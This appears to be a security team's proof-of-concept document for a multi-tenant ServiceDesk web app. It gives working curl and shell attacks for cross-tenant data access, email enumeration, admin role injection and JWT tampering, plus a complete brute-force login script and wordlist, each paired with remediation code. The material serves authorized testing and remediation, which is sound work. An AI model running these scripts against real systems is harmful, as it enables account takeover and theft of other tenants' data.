# AUTHORIZATION EXPLOITATION - PROOF OF CONCEPTS

**WARNING:** These PoCs are for AUTHORIZED security testing only.
**DO NOT** use against production systems without permission.

---

## POC-001: Cross-Tenant Data Access via AI Endpoint (CRITICAL)

### Vulnerability
Tenant ID accepted from request body allows access to ANY tenant's data.

### Affected Endpoint
```
POST /api/ai/detect-duplicates
```

### Exploitation Steps

#### 1. Setup Test Environment
```bash
# Terminal 1: Start ServiceDesk
npm run dev

# Terminal 2: Setup test tenants
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Attacker User",
    "email": "attacker@tenant1.com",
    "password": "Test123!@#",
    "organization_id": 1
  }'

# Get login token for Tenant 1
ATTACKER_TOKEN=$(curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@tenant1.com",
    "password": "Test123!@#"
  }' | jq -r '.token')

echo "Attacker Token: $ATTACKER_TOKEN"
```

#### 2. Legitimate Request (Own Tenant)
```bash
# Access own tenant's tickets (Tenant 1)
curl -X POST http://localhost:3000/api/ai/detect-duplicates \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -d '{
    "title": "Network Issue",
    "description": "Server is down",
    "tenant_id": 1,
    "threshold": 0.7
  }' | jq
```

**Expected:** Returns tickets from Tenant 1 (own tenant) ✅

#### 3. Malicious Request (Cross-Tenant Attack)
```bash
# ⚠️ ATTACK: Access Tenant 2's tickets from Tenant 1 account
curl -X POST http://localhost:3000/api/ai/detect-duplicates \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "x-tenant-slug: tenant1" \
  -d '{
    "title": "Probe",
    "description": "Looking for sensitive data",
    "tenant_id": 2,
    "threshold": 0.1
  }' | jq

# ⚠️ EXPECTED (VULNERABLE): Returns tickets from Tenant 2
# ✅ FIXED: Returns 403 Forbidden or uses Tenant 1 from JWT
```

#### 4. Verify Data Leakage
```bash
# Check if response contains Tenant 2 data
# Look for:
# - Ticket IDs from different organization
# - User emails from other domains
# - Internal project names/data

# If vulnerable, you'll see:
{
  "success": true,
  "similar_tickets": [
    {
      "id": 501,  # Tenant 2 ticket
      "title": "Confidential Project Alpha Issue",
      "user_email": "ceo@tenant2.com"
    }
  ]
}
```

### Impact
- ✅ Complete multi-tenant isolation bypass
- ✅ Access to ALL tenants' tickets
- ✅ Exposure of business-sensitive information
- ✅ Competitive intelligence gathering

### Remediation
```typescript
// ❌ BEFORE (Vulnerable)
export async function POST(request: NextRequest) {
  const body = await request.json();
  const { title, description, tenant_id } = body;  // ⚠️ From body!

  const recentTickets = db.prepare(query).all(tenant_id || 1);
}

// ✅ AFTER (Fixed)
export async function POST(request: NextRequest) {
  // Get tenant from authenticated context
  const tenantContext = getTenantContextFromRequest(request);
  const userContext = getUserContextFromRequest(request);

  if (!tenantContext || !userContext) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const body = await request.json();
  const { title, description, threshold = 0.85 } = body;
  // tenant_id removed from body parsing

  // Use authenticated tenant only
  const recentTickets = db.prepare(query).all(tenantContext.id);
}
```

---

## POC-002: Profile Update Without Tenant Validation (CRITICAL)

### Vulnerability
User profile update endpoint doesn't validate organization_id, allowing cross-tenant email manipulation.

### Affected Endpoint
```
PUT /api/auth/profile
```

### Exploitation Steps

#### 1. Create Test Accounts
```bash
# Create user in Tenant 1
TENANT1_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user1@tenant1.com",
    "password": "Test123!@#"
  }' | jq -r '.token')

# Create admin in Tenant 2 (if exists)
# admin@tenant2.com
```

#### 2. Information Disclosure via Email Check
```bash
# Try to update email to admin of Tenant 2
curl -v -X PUT http://localhost:3000/api/auth/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TENANT1_TOKEN" \
  -d '{
    "name": "Attacker",
    "email": "admin@tenant2.com"
  }'

# ⚠️ VULNERABLE Response:
# HTTP 409 Conflict
# {"message": "Email já está em uso"}
# ✅ Confirms admin@tenant2.com exists!

# ✅ FIXED Response:
# Either allows (different tenant) or doesn't leak info
```

#### 3. Account Enumeration
```bash
# Enumerate emails across all tenants
for email in admin@tenant{1..10}.com; do
  response=$(curl -s -X PUT http://localhost:3000/api/auth/profile \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TENANT1_TOKEN" \
    -d "{\"name\": \"Test\", \"email\": \"$email\"}")

  if echo "$response" | grep -q "já está em uso"; then
    echo "[+] Found: $email"
  fi
done

# ⚠️ VULNERABLE: Discovers all admin emails across tenants
```

#### 4. Missing Organization Filter Attack
```bash
# Direct database manipulation test (requires SQL injection or other vuln)
# This shows WHY organization_id is critical

# ⚠️ VULNERABLE Query:
# UPDATE users SET email = 'hacked@evil.com' WHERE id = 123
# ✅ Affects user from ANY tenant!

# ✅ FIXED Query:
# UPDATE users SET email = ? WHERE id = ? AND organization_id = ?
# ✅ Only affects users in authenticated tenant
```

### Impact
- Information disclosure (email enumeration)
- Potential account takeover via email confusion
- Cross-tenant data modification if combined with other vulns

### Remediation
```typescript
// ✅ FIXED VERSION
export async function PUT(request: NextRequest) {
  const { payload } = await jose.jwtVerify(token, JWT_SECRET);
  const userId = payload.id as number;
  const orgId = payload.organization_id as number;  // ✅ From JWT

  const { name, email } = await request.json();

  // ✅ Validate user exists in tenant
  const user = db.prepare(`
    SELECT id FROM users
    WHERE id = ? AND organization_id = ?
  `).get(userId, orgId);

  if (!user) {
    return NextResponse.json({ error: 'User not found' }, { status: 404 });
  }

  // ✅ Check email uniqueness WITHIN TENANT ONLY
  const existingUser = db.prepare(`
    SELECT id FROM users
    WHERE email = ? AND id != ? AND organization_id = ?
  `).get(email, userId, orgId);  // ✅ Same tenant only!

  if (existingUser) {
    return NextResponse.json({ error: 'Email already in use' }, { status: 409 });
  }

  // ✅ Update with organization_id filter
  db.prepare(`
    UPDATE users
    SET name = ?, email = ?, updated_at = CURRENT_TIMESTAMP
    WHERE id = ? AND organization_id = ?
  `).run(name, email, userId, orgId);  // ✅ Tenant-isolated
}
```

---

## POC-003: Admin Role Injection via Profile Update (MEDIUM)

### Vulnerability
Test if profile update accepts role parameter from request body.

### Exploitation Steps

#### 1. Setup Regular User
```bash
# Login as regular user
USER_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "regular@tenant1.com",
    "password": "Test123!@#"
  }' | jq -r '.token')
```

#### 2. Attempt Role Injection
```bash
# Try to inject admin role
curl -v -X PUT http://localhost:3000/api/auth/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{
    "name": "Hacker",
    "email": "regular@tenant1.com",
    "role": "admin"
  }' | jq

# Check if role changed
curl -X GET http://localhost:3000/api/auth/profile \
  -H "Authorization: Bearer $USER_TOKEN" | jq '.role'
```

#### 3. Test Admin Access
```bash
# If role injection worked, try admin endpoint
curl -X GET http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $USER_TOKEN"

# ⚠️ VULNERABLE: Returns HTTP 200 with user list
# ✅ FIXED: Returns HTTP 403 Forbidden
```

#### 4. Advanced Injection Attempts
```bash
# Try different field names
for field in role userRole user_role privilege level access_level; do
  echo "[*] Testing field: $field"
  curl -s -X PUT http://localhost:3000/api/auth/profile \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -d "{
      \"name\": \"Test\",
      \"email\": \"regular@tenant1.com\",
      \"$field\": \"admin\"
    }" | jq ".role // .error"
done
```

### Impact
- Vertical privilege escalation (user → admin)
- Unauthorized access to admin functions
- Potential data breach or system compromise

### Remediation
```typescript
// ✅ FIXED: Whitelist allowed fields
export async function PUT(request: NextRequest) {
  const body = await request.json();

  // ✅ Only extract allowed fields
  const { name, email } = body;
  // ❌ Explicitly ignore: role, privilege, access_level, etc.

  // ✅ Role changes must go through dedicated endpoint with admin auth
  // POST /api/admin/users/:id/change-role
}
```

---

## POC-004: JWT Token Tampering (INFO - Should Fail)

### Verification Test
Ensure JWT signature verification prevents tampering.

### Test Steps

#### 1. Get Valid Token
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@tenant1.com",
    "password": "Test123!@#"
  }' | jq -r '.token')

echo "Original Token: $TOKEN"
```

#### 2. Decode and Modify Payload
```javascript
// jwt-tamper.js
const token = process.argv[2];
const parts = token.split('.');

// Decode payload
const payload = JSON.parse(
  Buffer.from(parts[1], 'base64url').toString()
);

console.log('Original Payload:', payload);

// Tamper: Change role to admin
payload.role = 'admin';
payload.organization_id = 999;  // Try to access different org

// Encode modified payload
const tamperedPayload = Buffer.from(JSON.stringify(payload))
  .toString('base64url');

// Reconstruct token (with invalid signature)
const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;

console.log('Tampered Token:', tamperedToken);
console.log('\nAttempting authentication...');

// Test tampered token
const fetch = require('node-fetch');
fetch('http://localhost:3000/api/auth/profile', {
  headers: {
    'Authorization': `Bearer ${tamperedToken}`
  }
}).then(r => r.json()).then(console.log);
```

#### 3. Execute Test
```bash
# Run tampering script
node jwt-tamper.js "$TOKEN"

# ✅ EXPECTED (SECURE):
# HTTP 401 Unauthorized
# {"error": "Invalid signature"}

# ⚠️ VULNERABLE (if it works):
# HTTP 200 OK with admin profile
```

### Impact
If vulnerable: Complete authentication bypass
Expected: Signature verification prevents tampering ✅

---

## POC-005: Brute Force Attack (No Rate Limiting)

### Vulnerability
Authentication endpoint allows unlimited login attempts.

### Exploitation Steps

#### 1. Create Brute Force Script
```bash
#!/bin/bash
# brute-force-login.sh

TARGET="http://localhost:3000/api/auth/login"
EMAIL="admin@tenant1.com"
WORDLIST="passwords.txt"

echo "[*] Starting brute force against $EMAIL"
echo "[*] Wordlist: $WORDLIST"

while read -r password; do
  echo -n "[*] Trying: $password ... "

  response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{
      \"email\": \"$EMAIL\",
      \"password\": \"$password\"
    }")

  if echo "$response" | grep -q '"token"'; then
    echo "✅ SUCCESS!"
    echo "[+] Password found: $password"
    echo "$response" | jq
    exit 0
  else
    echo "❌"
  fi

  # ⚠️ NO DELAY - Testing rate limiting
  # ✅ SHOULD BE: sleep 1  # Rate limiting should block us
done < "$WORDLIST"

echo "[!] Password not found in wordlist"
```

#### 2. Create Password List
```bash
cat > passwords.txt << 'EOF'
password
Password123
admin
Admin123
Test123!@#
Welcome123
ServiceDesk2024
EOF
```

#### 3. Execute Brute Force
```bash
chmod +x brute-force-login.sh
time ./brute-force-login.sh

# ⚠️ VULNERABLE Output:
# All 7 attempts completed in < 2 seconds
# No rate limiting or account lockout

# ✅ FIXED Output:
# After 5 attempts: HTTP 429 Too Many Requests
# Account locked for 30 minutes
```

### Impact
- Unlimited password guessing attempts
- Account compromise via brute force
- Credential stuffing attacks

### Remediation
```typescript
// ✅ Add rate limiting
import { createRateLimitMiddleware } from '@/lib/rate-limit';

const loginRateLimit = createRateLimitMiddleware('auth', {
  maxAttempts: 5,
  windowMs: 15 * 60 * 1000,  // 15 minutes
  lockoutMs: 30 * 60 * 1000   // 30 minutes
});

export async function POST(request: NextRequest) {
  // ✅ Check rate limit first
  const rateLimitResult = await loginRateLimit(request, '/api/auth/login');
  if (rateLimitResult instanceof Response) {
    return rateLimitResult;  // 429 Too Many Requests
  }

  // Continue with authentication...

  // ✅ Track failed attempts in database
  if (!validPassword) {
    await incrementFailedAttempts(user.id);

    if (user.failed_login_attempts >= 5) {
      await lockAccount(user.id, 30 * 60 * 1000);
    }
  }
}
```

---

## POC-006: CSRF Token Bypass (Verification Test)

### Test CSRF Protection

#### 1. Test Without CSRF Token
```bash
# ⚠️ ATTACK: POST without CSRF token
curl -v -X POST http://localhost:3000/api/tickets/create \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: session=..." \
  -d '{
    "title": "CSRF Test",
    "description": "Testing CSRF protection"
  }'

# ✅ EXPECTED (SECURE):
# HTTP 403 Forbidden
# {"error": "CSRF token validation failed"}

# ⚠️ VULNERABLE:
# HTTP 201 Created (CSRF bypass!)
```

#### 2. Test With Invalid CSRF Token
```bash
# Get valid CSRF token
CSRF_TOKEN=$(curl -s http://localhost:3000/api/auth/csrf-token | jq -r '.token')

# Use modified token
FAKE_CSRF="invalid-token-12345"

curl -X POST http://localhost:3000/api/tickets/create \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-CSRF-Token: $FAKE_CSRF" \
  -d '{
    "title": "CSRF Test",
    "description": "Testing CSRF protection"
  }'

# ✅ EXPECTED: HTTP 403 Forbidden
```

#### 3. Test Valid CSRF Flow
```bash
# ✅ Proper flow
CSRF_TOKEN=$(curl -s http://localhost:3000/api/auth/csrf-token | jq -r '.token')

curl -X POST http://localhost:3000/api/tickets/create \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -d '{
    "title": "Valid Request",
    "description": "With proper CSRF token"
  }'

# ✅ EXPECTED: HTTP 201 Created
```

---

## DEFENSIVE TESTING CHECKLIST

### Before Deployment
```bash
# ✅ Run all PoCs
./tests/security/run-all-pocs.sh

# ✅ Expected Results:
# POC-001 (Tenant injection): 403 Forbidden ✅
# POC-002 (Profile validation): Tenant-scoped queries ✅
# POC-003 (Role injection): Role field ignored ✅
# POC-004 (JWT tampering): Invalid signature ✅
# POC-005 (Brute force): Rate limited ✅
# POC-006 (CSRF): Token validated ✅
```

### Automated Security Tests
```json
// package.json
{
  "scripts": {
    "test:security": "jest tests/security/",
    "test:auth": "jest tests/security/authorization-tests.ts",
    "test:pocs": "./tests/security/run-all-pocs.sh"
  }
}
```

---

## PENETRATION TESTING TOOLS

### Recommended Tools

```bash
# 1. OWASP ZAP - Automated vulnerability scanner
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000

# 2. Burp Suite - Manual testing
# - Intercept and modify requests
# - Test for injection vulnerabilities
# - Fuzz inputs

# 3. Postman/Insomnia Collections
# - Import ServiceDesk API collection
# - Run authorization tests
# - Automated regression testing
```

### Custom Test Scripts

```bash
# Multi-tenant isolation test
./scripts/test-tenant-isolation.sh

# Role escalation test
./scripts/test-privilege-escalation.sh

# Session security test
./scripts/test-session-security.sh
```

---

## REPORTING VULNERABILITIES

If you discover a vulnerability:

1. **DO NOT** disclose publicly
2. **DO NOT** exploit in production
3. **DO** report to security team: security@servicedesk.com
4. **DO** provide PoC and remediation suggestions
5. **DO** wait for patch before disclosure

---

**DISCLAIMER:** These PoCs are for authorized security testing only.
Use responsibly and ethically. Unauthorized access is illegal.

**Last Updated:** 2025-12-26
**Next Review:** After critical fixes deployed
